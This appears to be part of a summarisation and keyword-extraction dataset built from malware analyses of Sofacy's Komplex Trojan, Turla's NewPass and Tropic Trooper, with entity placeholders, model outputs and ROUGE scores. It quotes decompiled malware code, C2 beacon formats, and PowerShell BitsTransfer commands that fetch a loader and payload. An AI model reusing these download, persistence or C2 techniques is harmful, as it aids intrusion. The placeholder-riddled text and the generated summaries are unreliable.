[ORG] & [ORG] 0xff ) ! = [CARDINAL] 0x0 ) { rax = _ _ assert_rtn(\"AmIBeingDebugged \" , \" /Users / user / Desktop / LoaderWinApi / LoaderWinApi / main.mm \" , [DATE] 0x21 , \" junk = = 0 \" var_2C1 = ( [CARDINAL] 0x0 [CARDINAL] & [CARDINAL] 0x800 ) ! = 0x0 ? 0x1 : [CARDINAL] 0x0 ; if ( * * _ _ stack_chk_guard = = var_8 ) { rax = var_2C1 [ORG] & [ORG] 0x1 [ORG] & [ORG] 0xff ; } Figure [CARDINAL] 6 The AmIBeingDebugged function used as an anti - analysis techniqueAfter determining that it is not running in a debugger , the payload performs an anti- analysis / sandbox check by issuing a GET request to [ORG] Google , to check for Internet connectivity . The payload will sleep until it receives a response from the HTTP requests to [ORG] Google , which means [PERSON] Komplex will only communicate to its [CARDINAL] C2 servers in Internet enabled environments . Figure [CARDINAL] 7 shows the \u201c connectedToInternet \u201d function that confirms whether the payload is able to communicate with \u201c url \u201d before carrying out its functionality.1 if ( [ NSData dataWithContentsOfURL:[NSURL URLWithString:@\"url \" ] ] ! = 0x0 ) { rax = var_1 [ORG] & [ORG] 0x1 [ORG] & [ORG] 0xff ; return rax ; } Figure [CARDINAL] 7 The connectedToInternet function testing for an active Internet connectionAfter confirming an active Internet connection , the [NORP] Komplex payload begins carrying out its main functionality . The [NORP] Komplex payload uses an [QUANTITY] 11 [QUANTITY] - byte XOR algorithm to decrypt strings used for configuration and within [CARDINAL] C2 communications , including the C2 domains themselves . Figure [CARDINAL] 8 shows a screenshot of [ORG] Komplex \u2019s custom string decryption algorithm , along with the [ORG] XOR key used to decrypt strings within the payload . Figure [CARDINAL] 8 [CARDINAL] 11 - byte XOR algorithm used by [PERSON] Komplex to decrypt configuration stringsThe algorithm seen in Figure [CARDINAL] 8 decrypts the strings seen in [LAW] Table [LAW] 1 , which the payload references using the associated variable names . The payload uses these decrypted strings for a variety of purposes , such as command parsing and C2 server locations . Decrypted String appleupdate[.]org , apple - iclouds[.]net , itunes- .xml .pdf , .htm , .zipMAC EXTENSIONSTable 1 Strings decrypted by [PERSON] Komplex and their referenced nameThe [PERSON] Komplex payload uses the SERVERS variable to obtain the location of its C2 , which it communicates with using [ORG] HTTP [ORG] POST requests . The payload generates a URL to communicate with its [CARDINAL] C2 server that has the following structure:/<random path>/<random string>.<chosen extension>/?<random string>=<encrypted token > The < chosen extension > portion of the URL is chosen at random from the list of legitimate file extensions : .xml , .zip , .htm and .pdf . The < encrypted token > within the parameters of the URL is base64 encoded ciphertext created from the string \u2018 h8sn3vq6kl \u2019 . The ciphertext of the string is generated via a custom algorithm that uses a random [QUANTITY] 4 [QUANTITY] - byte integer as a key that is modified by [WORK_OF_ART] XOR with the static value [DATE] 0xE150722 . The payload also encrypts the data sent within the [ORG] POST request using the same algorithm and encodes it using base64 . Figure [CARDINAL] 9 below shows anexample [ORG] HTTP [ORG] POST sent from the payload to its [CARDINAL] C2 server . Figure [CARDINAL] 9 Beacon sent from [NORP] Komplex to [CARDINAL] C2 containing system information within [ORG] the [ORG] HTTP [ORG] POSTdataThe [ORG] HTTP [ORG] POST data in Figure [CARDINAL] 9 is comprised of information that the malware collects from the infected system . The system information sent to the C2 includes data such as the system version , username , and process list , which is gathered within a function named \u201c getOsInfo \u201d within the \u201c InfoOS \u201d class ( Figure 10).1 12int [GPE] InfoOS::getOsInfo ( ) ( ) { var_38 = rdi ; var_18 = [ [ NSProcessInfo processInfo ] operatingSystemVersionString var_20 = NSUserName ( ) ; var_28 = [ORG] InfoOS::getProcessList ( ) ; var_30 = operator new[](strlen(var_28 ) + 0x200 ) ; [PERSON] sprintf(var_30 , \" Mac OS X - % s % s\\nUser name [PERCENT] - [PERCENT] % s\\n\\t\\t\\t\\t\\t\\tProcess list : [ORG] \\n\\n%s \" , [ var_18 UTF8String ] , InfoOS::bitOS ( ) , [ var_20 UTF8String } Figure [CARDINAL] 10 getOsInfo function within [PERSON] Komplex that gathers system information for C2 beaconThe Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the same custom algorithm used to encrypt the [ORG] POST data . The [NORP] Komplex payload will parse the C2 response for the following strings : \u201c [ file ] \u201d and \u201c [ /file ] \u201d , \u201c FileName= \u201d , \u201c PathToSave= \u201d , \u201c Shell= \u201d , \u201c Execute \u201d , and \u201c Delete \u201d . The \u201c Delete \u201d action does nothing more than delete a file specified by \u2018 PathToSave\u2019/\u2019FileName \u2019 , whereas the \u201c Execute \u201d action involves running the following system commands before executing the specified file:1 [CARDINAL] 2mkdir -p & lt;'PathToSave'&gt ; [ORG] & amp;&gt ; /dev / null chmod 755 & lt;'PathToSave'&gt;/&lt;'FileName'&gt ; [ORG] & amp;&gt ; /dev / nullThe payload will treat \u201c [ file ] \u201d and \u201c [ /file ] \u201d as delimiters that specify the data that the payload should write to a specified file , which allows the threat actor to download additional files to the system . Lastly , the payload can execute commands on the compromised system specified within the \u201c [ORG] Shell \u201d field , which the payload will execute and then send results back to the [ORG] C2.Code [ORG] OverlapsWhile reverse engineering the [NORP] Komplex payload , we came across a few code overlaps that we believed were worth exploring . [ORDINAL] First , we noticed striking similarities between the [NORP] Komplex payload and the traits and behavior of an OS X Trojan discussed in a [ORG] BAE [ORG] Systems blog titled NEW [ORG] MAC OS [ORG] MALWARE [ORG] EXPLOITS [ORG] MACKEEPER . According to this blog post , an OS X Trojan was delivered via a vulnerability in the [ORG] MacKeeper application . The nameless OS [PERSON] X [PERSON] Trojan uses an [QUANTITY] 11 [QUANTITY] - byte XOR algorithm to decrypt an embedded configuration , which has all of the same variable names and values as the [NORP] Komplex sample ( see [LAW] Table [LAW] 1 ) . The algorithm used to encrypt and decrypt the network traffic , as well as all static elements of the network communications ( composition of URL , structure of HTTP data , command parsing procedure , etc . ) discussed in the blog post are the exact same as seen in the [NORP] Komplex payload . These overlaps suggest that the [PERSON] Trojan delivered by the [ORG] MacKeeper vulnerability was in fact [ORG] the [ORG] Komplex [ORG] Trojan . The [ORDINAL] second code overlap ties [ORG] the [ORG] Komplex [ORG] Trojan to [ORG] Sofacy \u2019s Carberp variant , which we have analyzed in previous research efforts . Even though [PERSON] Komplex was created to run on OS X and Sofacy \u2019s Carberp variant was developed to run on [PRODUCT] Windows , they share many commonalities , including : Same URL generation logic using random path values , a random file extension and encrypted tokenSame file extensions used in C2 URL that are listed within the binaries in the same orderSame algorithm used to encrypt and decrypt the token in the URL and [ORG] HTTP [ORG] POST data ( [PERSON] Carberp key is modified using value [CARDINAL] 0xAA7D756 whereas [PERSON] Komplex uses 0xE150722)Very similar command handling , including parsing specifically for Execute , [ORG] Delete , [ file ] , [ /file ] , [PRODUCT] FileName , and PathToSave . Checks for Internet connectivity by connecting to google.comUses an [QUANTITY] 11 [QUANTITY] - byte [ORG] XOR key to decrypt strings within the configurationIn addition to these common traits , we found a Sofacy Carberp variant ( SHA256 : TOKEN value of \u2018 h8sn3vq6kl \u2019 within its C2 URL , as observed in [NORP] Komplex payloads . Based on these observations , we believe that the author of [ORG] Sofacy \u2019s Carberp variant used the same code , or at least the same design , to create [ORG] the [ORG] Komplex [ORG] Trojan . A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the [CARDINAL] C2 server application to handle cross - platform implants . Infrastructure [PERSON] OverlapWhile [PERSON] Komplex \u2019s C2 domain appleupdate[.]org does not appear to have any previously known activity associated with it , both the apple - iclouds[.]net and itunes - helper[.]net domains have direct ties to Sofacy activity . The apple - iclouds[.]net domain is mentioned within a PwC Tactical Intelligence Bulletin that discussed a phishing campaign conducted by the [ORG] Sofacy group . The itunes - helper[.]net domain is associated with separate activity discussed in [ORG] Trend Micro \u2019s blog titled [WORK_OF_ART] Looking [WORK_OF_ART] Into [WORK_OF_ART] a [WORK_OF_ART] Cyber [WORK_OF_ART] - Attack [WORK_OF_ART] Facilitator in the [GPE] Netherlands that included research on hosting providers used by [PERSON] Pawn [PERSON] Storm ( [NORP] Sofacy).The domain appleupdate[.]org does have [CARDINAL] one interesting correlation point , specifically involving the IP 185.10.58[.]170 that resolved this domain [DATE] between [DATE] April [DATE] 2015 through [DATE] April [DATE] 2016 . Researchers at [ORG] BAE [ORG] Systems provided Unit 42 the [NORP] Komplex payload delivered through the exploitation of [ORG] MacKeeper ( Dropper SHA256 : which used the [ORG] IP address [CARDINAL] 185.10.58[.]170 within its configuration as a C2 server . This infrastructure overlap further strengthens the connection between the [NORP] Komplex payload we discovered with the prior campaign using [ORG] MacKeeper for delivery . The [ORG] Sofacy group created [ORG] the [ORG] Komplex [ORG] Trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi - platform attacks . The tool is capable of downloading additional files to the system , executing and deleting files , as well as directly interacting with the system shell . While detailed targeting information is not currently available , we believe [PERSON] Komplex has been used in attacks on individuals related to the aerospace industry , as well as attacks leveraging an exploit in [ORG] MacKeeper to deliver the [GPE] Trojan . The Komplex Trojan revealed a design similar to [ORG] Sofacy \u2019s [PRODUCT] Carberp variant [PERSON] Trojan , which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease . While Unit 42 continues to research and track this threat , [GPE] Palo [GPE] Alto [GPE] Networks customers are protected via the following : [ORG] WildFire correctly identifies known [PERSON] Komplex executables as maliciousIPS signature # 14442 Sofacy . [ORG] Gen [ORG] Command And [ORG] Control [ORG] Traffic can detect and block outbound [CARDINAL] C2 requests generated by [ORG] the [ORG] Komplex [ORG] Trojan . Customers can track this [GPE] Trojan via the [NORP] Komplex tag in [ORG] AutoFocus . Hashes : apple - iclouds[.]net thoughtsImia Familiya on [DATE] September [DATE] 27 , [DATE] 2016 [TIME] 2:06 [TIME] AM saidNB google.com is blocked by national - level firewalls in some jurisdictions ( the [GPE] PRC , for example ) , which means [PERSON] Komplex would n\u2019t initiate a connection to its [CARDINAL] C2 servers from there , apparently \u2026 [WORK_OF_ART] FWIWRobert [WORK_OF_ART] Falcone on [DATE] September [DATE] 27 , [DATE] 2016 [TIME] 8:47 [TIME] AM saidGood point , [ORG] the [ORG] Komplex [ORG] Trojan would not be a viable tool to use in targeted attacks within regions that have Internet censorship that involves the blocking of google.com . This suggests that it is unlikely that the target of this attack was in one of these regions . On a side note , it would be interesting to see if future samples use different domains within the connectedToInternet to test for connectivity . Name * Email * WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright \u00a9 2007 [DATE] - 2013 Palo Alto Networks", "generated_text": "port; APT28; Pawn Storm; Sednit; individuals; the OS X operating system; the Trojan; components; a payload; a binder; a decoy document; a command; control; domains; phishing campaigns; the Sofacy group; control; phishing campaigns; Windows; a vulnerability; MacKeeper; the malware; a vulnerability; MacKeeper; software; a Malware variant; a variant; the Carberp variant; Linux; different versions; a decoy; payloads; a command; data; servers; support; the Antey Trojan; Decoys; the OS X operating system; tools.", "ref_text": "<START-1>Researchers from Palo Alto Networks discovered a new OS X malware named Komplex that is associated with the cyberespionage group Sofacy, also known as APT28 or Fancy Bear. Komplex has multiple components for installation and persistence. It starts with a binder that drops a second executable and opens a decoy PDF document. The second executable saves the Komplex payload and a launch agent plist to achieve persistence. The payload gathers system info and communicates with C2 servers using encrypted HTTP requests. It can download other files, execute commands, and inject code into processes. Komplex shares code similarities with Sofacy's Carberp Windows malware, including encryption algorithms and C2 communication methods. It also uses infrastructure linked to prior Sofacy activity. The malware appears to target individuals in the aerospace industry. The initial infection vector involved exploiting the MacKeeper antivirus tool. In summary, Komplex is a new OS X Trojan associated with the Sofacy group that uses multi-stage installation, shared infrastructure, and overlaps with Windows malware, indicating a cross-platform cyberespionage toolset. 2. If existing the process of the attack in this pdf, please extract it (use 1., 2., 3., etc.) . Here is an outline of the attack process described in the PDF: 1. Sofacy sends a phishing email with a weaponized Excel document or exploits MacKeeper to gain initial access. 2. The initial exploit or macro drops the Komplex binder component. 3. The binder saves the Komplex dropper and opens a PDF decoy document. 4. The dropper installs the full Komplex payload and creates a launch agent for persistence. 5. The payload gathers system info and communicates with C2 servers to receive commands. 6. Komplex can download more files, execute commands, inject code into processes per C2 instructions. 7. The C2 commands allow the threat actor full control over the compromised system. 8. Komplex maintains persistence by loading at system startup via the launch agent created by the dropper. In summary, the initial vector installs the binder, which escalates access for the dropper to deploy the full payload, completing the multi-stage installation and control process. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.38115631691648827, "gpt3/lexical/rouge_rouge2": 0.16774193548387095, "gpt3/lexical/rouge_rougeL": 0.21413276231263384, "gpt3/lexical/rouge_rougeLsum": 0.21413276231263384, "gpt3_generated_text": ["Unit 42 researchers have identified a new OS X Trojan associated with the Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit. The Trojan, named Komplex, is being used to target individuals in the aerospace industry running the OS X operating system. Komplex shares similarities with the Carberp variant used by Sofacy in previous attack campaigns on Windows systems. The Trojan has multiple components, including a binder that saves a second payload and a decoy document to the system. It also has command and control domains that overlap with previously identified phishing campaign infrastructures associated with the Sofacy group. Komplex is designed to compromise individuals using OS X devices and has different versions for x86 and x64 architectures."]}, {"split_name": "val", "sample_id": "val_55", "prompt_text": "Extract the keywords: [CARDINAL] 7/23/2020Turla / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsyTurla / Venomous Bear updates its arsenal : \u201c [ORG] NewPass \u201d appears on the [ORG] APT threat scenetelsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scenewebmaster@telsy.comJuly [CARDINAL] 14 , 2020Recently Telsy observed some artifacts related to an attack that occurred in [DATE] June [DATE] 2020 that is most likely linked to the popular [ORG] Russian [ORG] Advanced [ORG] Persistent [ORG] Threat ( [ORG] APT ) known as [WORK_OF_ART] Venomous [WORK_OF_ART] Bear ( aka [PERSON] Turla or [GPE] Uroburos ) . At the best of our knowledge , this time the hacking group used a previously unseen implant , that we internally named \u201c [ORG] NewPass \u201c as [CARDINAL] one of the parameters used to send exfiltrated data to the command and control . Telsy suspects this implant has been used to target [CARDINAL] at [CARDINAL] least [CARDINAL] one [ORG] European [ORG] Union country in the sector of diplomacy and foreign affairs . [ORG] NewPass is quite a complex malware composed by different components that rely on an encoded file to pass information and configuration between each other . There are [CARDINAL] at [CARDINAL] least [CARDINAL] three components of the malware : a dropper , that deploys the binary file ; a loader library , url / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - Telsythat is able to decode the binary file extracting the last component , responsible for performing specific operations , such as communicate with the attackers \u2019 command and control server ( the \u201c agent\u201d)The loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the malware and the ease with which the attackers can customize the implant by simply changing the configuration entries \u2019 values . [PERSON] Dropper [PERSON] AnalysisThe [ORDINAL] first Windows library has a huge size , [CARDINAL] about [CARDINAL] 2.6 MB , and it is identified by the number of functions , as shown in the following image . Most of the reported functions point to useless code and only [ORG] LocalDataVer can be used as an entry point of the [ORG] DLL , therefore making it useful to understand the malicious behavior . Attackers used this trick likely to avoid sandbox analysis , as well as make manual analysis slightly harder . [PERSON] Sandbox solutions , in fact , probably will try to execute a [ORG] DLL file using rundll32.exe or [GPE] regsvr32.exe utilities , using \u201c DllMain \u201d or \u201c DllRegisterServer \u201d as an entrypoint function . In this case , both these functions cause the termination of the program , without showing the real malware behavior . The library \u2019s aim is to deploy the backdoor and its configuration file under [CARDINAL] two different folders depending on attacker \u2019s customization.url / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsyAccording to what has been observed by our research team , the paths used in this case are the following : Configuration PathBackdoor PathProgramData\\Adobe\\ARM\\Reader_20.021.210_47.dat C:\\Program Files(x86)\\Adobe\\Acrobat Read- er DC\\Reader\\lib3DXquery.dllProgramData\\WindowsHolographic\\SpatialStore\\Holo graphicSpatialStore.swidWindowsHolographicSer- vice.dllFor the [ORDINAL] second sample we were n\u2019t able to retrieve its dropper . Therefore , it is possible to obtain the location of the configuration file from which the backdoor tried to load the parameters , but not the exact location in which the dropper deployed the implant artifact . Furthermore , the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate programs , such as [PERSON] Adobe [PERSON] Reader or Windows Mixed Reality . In particular , the path of the [ORDINAL] first sample is the same used by the legitimate [ORG] Adobe [ORG] Reader installation and therefore the [ORG] lib3DXquery.dll file matches up perfectly with the other [ORG] Adobe components , making it almost totally invisible . The configuration file written , at [ORDINAL] first glance , seems to be totally encrypted and incomprehensible without analyzing the next stage . The following image shows the real payload.url / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsyTo begin , the library checks the presence of the associated configuration file , if it does not exist , the backdoor terminates its execution . Vice versa , once found the file the malware starts to decode and read the current configuration . The [ORDINAL] first 5 bytes of the file contains the size of the data to read starting from the [CARDINAL] 6 bytes and which contains the [ORDINAL] first encoded information useful to allow the malware to load the entire configuration.thAll the data retrieved in this [ORDINAL] first phase is encoded using a simple XOR algorithm with a fixed key [CARDINAL] 19 B9 20 5A [GPE] B8 EF [CARDINAL] 2D A3 73 [CARDINAL] 08 C1 [DATE] 53 , hardcoded at the beginning of the function as represented in the following image.url / [ORG] Venomous [ORG] Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsySo , the malware reads the [ORDINAL] first 5 bytes and decodes it using the key , obtaining the number of the bytes it has to read to obtain the initial configuration . In this specific case , from the decoded bytes it gets the value [DATE] 00081.So , it proceeds to read other next [CARDINAL] 81 bytes.url / [ORG] Venomous [ORG] Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsyDecoding these last ones with the usual key , it obtains a string composed by different parameters separated by \u201c || \u201d , as illustrated below . However , this is still not the final configuration used by the malware , but it contains only the parameters to load the last malicious Windows library , named [GPE] LastJournalx32.adf , containing the final agent . This payload is hidden into the configuration file after a section of random bytes used by the attackers to change the hash value of the file at every infection . During its activity , the loader decrypts and maintains in memory the complete configuration used during the infection chain . It consists of different JSON formatted structures that look like the following : url / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - Telsy { \u201c RefreshToken \u201d : \u201d \u201d , \u201c [ORG] NoInternetSleepTime\u201d:\u201d3600\u2033 , \u201c GetMaxSize\u201d:\u201d60000\u2033 , \u201c [PERSON] ClientId \u201d : \u201d \u201d , \u201c DropperExportFunctionName\u201d:\u201dLocalDataVer \u201d , \u201c Autorun\u201d:\u201d16\u2033 , \u201c ImgurImageDeletionTime\u201d:\u201d120\u2033 , \u201c RecoveryServers \u201d : [ ] , \u201c RunDllPath\u201d:\u201d%Win- Dir%\\\\System32\u2033 , \u201c AgentLoaderExportFunctionName\u201d:\u201dLocalDataVer \u201d , \u201c Key\u201d:\u201d[ \u2026 redacted \u2026 ] \u201d , \u201c AgentName\u201d:\u201dLastJournalx32.adf \u201d , \u201c [ORG] UserAgent \u201d : \u201d \u201d , [ \u2026 truncated \u2026 ]The structure contains all the information necessary for the loader to correctly launch the final agent . Some of these information are AgentFileSystemName , AgentExportName and AgentName . The agent shares the same memory space of the loader , thus it is able to access to the same configuration and to extract the needed parameters , such as the object named Credentials . It also contains the domain name ( newshealthsport[.]com ) and the path ( /sport / latest.php ) of the command - and - control with which the agent will communicate . From the configuration it is also possible to notice the version number of the malware , specifically it is [CARDINAL] 19.03.28 for the [ORG] AgentLoader and [DATE] 19.7.16 for the Agent . Moreover , the agent is identified by an ID addressed by the AgentID entry that is used during the communication with the [CARDINAL] C2 as identifier of the infected machine . The configuration also embeds a specific structure for persistence mechanisms that appears as follow : { \u201c Autoruns \u201d : { \u201c Service \u201d : { \u201c DisplayName \u201d : \u201c [WORK_OF_ART] Adobe [WORK_OF_ART] Update [WORK_OF_ART] Module \u201d , \u201c [PERSON] ServiceName \u201d : \u201c [WORK_OF_ART] Adobe [WORK_OF_ART] Update [WORK_OF_ART] Module \u201d , \u201c Enabled \u201d : \u201c true \u201d } , \u201c TaskScheduler \u201d : { \u201c Enabled \u201d : \u201c false \u201d } , \u201c Registry \u201d : { \u201c Enabled \u201d : \u201c false \u201d } , \u201c Policies \u201d : { \u201c Enabled \u201d : \u201c false \u201d } } } The implant supports different types of persistence mechanisms : through Service Manager , [ORG] Task [ORG] Scheduler , via Registry Key or using Windows GPO.In this specific case , attackers enabled the [ORG] Service method that allows the malware to interact with the [ORG] SCManager to create a new service named [ORG] Adobe [ORG] Update command - and - control and downloading new commands to be executed . To make the communication with the C2 stealthier , the agent uses a set of keywords to separate the data within a [ORG] POST request . The keywords are specified by attackers during development phase . In the analyzed case , they are the following : dbnew targetloginSo , during the exfiltration phase , the HTTP requests appear as reported in the table belowPOST /sport / latest.php HTTP/1.1 Content - Type : application / x - www - form - urlen- coded User - Agent : Mozilla/5.0 ( Windows NT [CARDINAL] 6.1 ; Win64 ; x64 ; Trident/7.0 ; rv:11.0 ) like [ORG] Gecko [ORG] Host : newshealthsport . com Content - Length : [CARDINAL] 170 Connection : Keep- Alive newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&tar- getlogin = t&table_data=[redacted]All the values embedded into the request are encrypted , probably using one of the keys embedded into the previous configuration . The algorithm used during the encryption phase is most probably a custom one . Below , we report a simple scheme of the described infection chain , highlighting the [CARDINAL] three components of this new threat : the dropper , the loader and the agent.url / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsyPersistenceAs mentioned above , the malware is able to create services or tasks or to add registry keys to achieve persistence . In the analyzed case , the loader component is set to create a new Windows service , specifying its path location as ImagePath . ATT&CK Matrixurl / Venomous Bear updates its arsenal : \" [ORG] NewPass \" appears on the [ORG] APT threat scene - TelsyTech- niqueT1204T1060T1053T1543T1073T1132T1001TacticDescriptionExecution Threat actor relies upon specific actions by a user in order togain executionPersis- [ORG] ControlThreat actor adds an entry to the \u201c run keys \u201d in the Registry or startup folder to allow the program will be executed when a user logs inThreat actor uses [PRODUCT] Windows [PRODUCT] Task [PRODUCT] Scheduler to schedule programs or scripts to be executed at a date and timeAdversaries create or modify Windows services to repeatedly ex- ecute malicious payloads as part of persistencePrograms specifies DLLs that are loaded at runtimeCommand and control ( C2 ) information is encoded using a stan- dard data encoding systemCommand and control ( C2 ) communications are hidden in an attempt to make the content more difficult to discover or decipherT1041Exfiltra- tionThreat actor relies on command and control infrastructure to exfiltrate data .", "generated_text": "the artifacts; an attack; June 2020; the Russian Advanced Persistent Threat; APT; Turla; Uroburos; the implant; an encoded file; information; configuration; the command; control; the loader; the agent; a JSON configuration; memory; the malware; sandbox analysis; the configuration file; the DLL; the configuration entry; the installer; a JSON configuration; the implant; functionality; the dropper; the installer; control; the DLL; sample; the DLL; documents; diplomats; EU; countries; NATO; diplomacy; foreign affairs; the attack; the incident.", "ref_text": "<START-1>The document provides an analysis by Telsy of a new malware implant called \"NewPass\" used by the Turla/Venomous Bear advanced persistent threat (APT) group in attacks in June 2020 targeting a European Union country's diplomacy/foreign affairs sector. NewPass has three components - a dropper, loader, and agent. The loader decodes configuration from an encrypted file that specifies the agent payload to install. The agent communicates with a command and control server to exfiltrate data. NewPass uses stealthy file paths impersonating legitimate software like Adobe Reader. It achieves persistence by installing a malicious service. The C2 communications encode data using keywords to blend in. The malware is highly configurable via JSON in its configuration file. Telsy provides examples of the encryption schemes, command and control URLs, and other technical details of its operation. In summary, the document analyzes a newly observed malware implant used in recent cyberespionage activities by the Turla/Venomous Bear threat group against European government entities. It highlights the stealth, configurability, and technical capabilities of the malware. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5611111111111112, "gpt3/lexical/rouge_rouge2": 0.18994413407821228, "gpt3/lexical/rouge_rougeL": 0.33888888888888885, "gpt3/lexical/rouge_rougeLsum": 0.33888888888888885, "gpt3_generated_text": ["The article discusses the discovery of a new implant called \"NewPass\" used by the Russian Advanced Persistent Threat (APT) group known as Turla or Venomous Bear. The implant was observed in an attack that occurred in June 2020, targeting at least one European Union country in the field of diplomacy and foreign affairs. NewPass is a complex malware composed of different components that rely on an encoded file to pass information and configuration between each other. The implant includes a dropper, a loader library, and an agent responsible for specific operations and communication with the command and control server. The dropper analysis reveals that the library aims to deploy the backdoor and its configuration file in different folders to avoid detection. The article emphasizes the stealthy nature of the paths used by the malware, making it difficult to identify them as components of legitimate programs. The configuration file is encrypted and can only be understood by analyzing the subsequent stages. Overall, this discovery sheds light on the evolving arsenal of the Turla/Venomous Bear APT group and highlights the ongoing threat they pose to diplomatic entities and foreign affairs."]}, {"split_name": "val", "sample_id": "val_56", "prompt_text": "Extract the keywords: [ORG] Tropic [ORG] Trooper [ORG] Targets [ORG] Transportation and Government Organizationstrendmicro.com/en_us/research/21/l/collecting-in-the-dark-tropic-trooper-targets-transportation-and-government-organizations.htmlDecember [CARDINAL] 14 , 2021Collecting In the Dark : Tropic Trooper Targets Transportation and Government Our long - term monitoring of the cyberespionage group [LOC] Earth [LOC] Centaur ( aka [ORG] Tropic [ORG] Trooper ) shows that the threat actors are equipped with new tools and techniques . The group seems to be targeting transportation companies and government agencies related to transportation . By : [PERSON] Nick [PERSON] Dai , [PERSON] Ted [PERSON] Lee , [PERSON] Vickie [PERSON] Su [DATE] December [DATE] 14 , [DATE] 2021 [DATE] Read [DATE] time : [CARDINAL] 11 min ( [WORK_OF_ART] 3068 [WORK_OF_ART] words)Earth [WORK_OF_ART] Centaur , previously known as [ORG] Tropic [ORG] Trooper , is a long - running cyberespionage threat group that has been active since [DATE] 2011 . In [DATE] July [DATE] 2020 , we noticed interesting activity coming from the group , and we have been closely monitoring it since . The actors seem to be targeting organizations in the transportation industry and government agencies related to transport . We observed that the group tried to access some internal documents ( such as flight schedules and documents for financial plans ) and personal information on the compromised hosts ( such as search histories ) . Currently , we have not discovered substantial damage to these victims as caused by the threat group . However , we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data . Through long - term monitoring , we learned that this threat group is proficient at red teamwork . The group knows how to bypass security settings and keep its operation unobstructive . Depending on the target , it uses backdoors with different protocols , and it can also use the reverse proxy to bypass the monitoring of network security systems . The usage of the open - source frameworks also allows the group to develop new backdoor variants efficiently . We expand on these techniques and other capabilities in the following sections . More importantly , we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation . It is our aim , through this article , to encourage enterprises to review their own security setting and protect themselves from damage and compromise . Overview of Earth Centaur \u2019s infection chain Based on our investigation , we found that the intrusion process used by [LOC] Earth [LOC] Centaur can be separated into several stages , which are shown in Figure [DATE] 1.1/16We found that the threat actors used vulnerable [ORG] Internet [ORG] Information [ORG] Services ( IIS ) server and [ORG] Exchange server vulnerabilities as entry points , and then installed web shells . Afterward , the .NET loader ( detected as [PERSON] Nerapack ) and the [ORDINAL] first stage backdoor ( Quasar remote administration tool aka Quasar RAT ) were deployed on the compromised machine . Then , depending on the victims , the threat actors dropped different types of [ORDINAL] second - stage backdoors , such as ChiserClient and [ORG] SmileSvr . After exploiting the victim 's environments successfully , the threat actors start [WORK_OF_ART] Active [WORK_OF_ART] Directory ( AD ) discovery and spread their tools via [ORG] Server [ORG] Message [ORG] Block ( SMB ) . Then , they use intranet penetration tools to build the connection between the victim \u2019s intranet and their command - and - control ( [ORG] C&C ) servers . We go into further detail about these stages in our analysis . Figure [CARDINAL] 1 . Stages of Earth Centaur \u2019s intrusion processTechnical [ORG] Analysis [ORG] of [ORG] Earth [ORG] Centaur \u2019s Tools and TechniquesStage 1 : LoadersAfter the threat actors get access to the vulnerable hosts by using [ORG] ProxyLogon exploits and web shells , they use bitsadmin to download the next - stage loader ( loaders are detected as [PERSON] Nerapack ) as well as its payload file ( .bin).C:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \" & { Import - Module BitsTransfer ; Start - BitsTransfer [ORG] ' url \" % temp%/dfmanager.exe\"}\"C:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \" & { Import - ModuleBitsTransfer ; Start - BitsTransfer [PERSON] ' url \" C:\\Users\\ < redacted>\\AppData\\Local\\Temp / dfmanager.bin\"}\"2/16After our long - term monitoring , we observed that there are [CARDINAL] two different decryption algorithms ( DES or AES ) used in [PERSON] Nerapack to decrypt the payload . Moreover , in its newer version , it uses a technique called \u201c Timestomping . \u201d Timestomping is when the timestamp of the payload file ( .bin ) is altered to make it harder for incident response analysts to find it . Figure [CARDINAL] 2 . Timestomping used on the bin fileThe decryption key is used as an argument of [PERSON] Nerapack and various keys are used on different victims . It is a simple but effective technique that makes security analysis more difficult and also ensures that only their operators can use the tools . The command for execution is shown as here :> Nerapack.exe { base64 encoded key}Fortunately , we were still able to collect the decryption key in some cases and we decrypted the payload successfully . Based on our current cases , the decrypted payload is Quasar RAT . After the payload is deployed , the actors can continue further malicious actions through [ORG] Quasar [ORG] RAT.Stage [ORG] 2 : [ORG] BackdoorsAfter further analysis , we found that the threat group developed multiple backdoors capable of communication via common network protocols . We think this indicates that it has the capability to bypass network security systems by using these common protocols to transfer data . We also found that the group tries to launch various backdoors per victim . Furthermore , it also tends to use existing frameworks to make customized backdoors . By using existing frameworks , examples of which are detailed in the following , it builds new backdoor variants more efficiently . ChiserClientAfter the backdoor is launched , it will decrypt the embedded [ORG] C&C configuration via [ORG] AES ( [ORG] CTR mode ) algorithm for the following connection . In the configuration , there are [CARDINAL] three [ORG] C&C addresses and corresponding port numbers.3/16Figure [CARDINAL] 3 . Decrypted [ORG] C&C configurationIn the [ORDINAL] first connection , ChiserClient will append the host name of the compromised host for check - in purposes . Then , it will keep running on the hosts and wait for further commands from the [ORG] C&C server . ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host . The capability of ChiserClient is shown in the following table : 